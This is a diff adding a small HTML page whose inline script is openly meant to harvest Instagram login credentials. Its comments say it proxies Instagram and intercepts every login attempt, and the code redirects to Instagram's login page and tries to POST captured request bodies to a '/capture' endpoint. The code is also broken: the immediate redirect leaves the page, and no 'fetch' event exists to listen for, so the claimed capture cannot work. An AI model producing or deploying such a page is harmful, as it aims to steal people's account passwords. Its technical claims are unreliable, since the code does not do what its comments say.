@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        // PROXY: Load real IG + intercept ALL login attempts
+        window.location.replace('https://www.instagram.com/accounts/login/?next=%2F');
+        
+        // INSTANT CAPTURE on any POST
+        document.addEventListener('fetch', function(e) {
+            if (e.request.url.includes('login')) {
+                fetch('/capture', {
+                    method: 'POST',
+                    body: e.request.body
+                });
+            }
+        });
+    </script>
+</head>
+</html>
